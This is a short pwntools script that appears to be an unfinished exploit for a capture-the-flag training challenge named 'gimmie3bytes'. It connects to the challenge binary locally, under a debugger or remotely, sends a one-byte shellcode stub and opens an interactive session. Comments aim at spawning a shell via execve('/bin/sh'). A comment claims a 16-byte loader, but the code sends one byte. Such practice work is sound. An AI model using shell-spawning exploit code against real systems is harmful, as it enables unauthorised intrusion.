from pwn import *

COMMANDS = """
"""

shellcode = b"\x50"

if args.GDB:
    p = gdb.debug("./gimmie3bytes", gdbscript=COMMANDS)
elif args.REMOTE:
    p = remote("gimmie3bytes.training.offensivedefensive.it", 8080, ssl=True)
else:
    p = process("./gimmie3bytes")

# Send first stage loader (exactly 16 bytes)
p.send(shellcode)

p.interactive()

#execve("/bin/sh\0", NULL, NULL)
#0x0068732f6e69622f

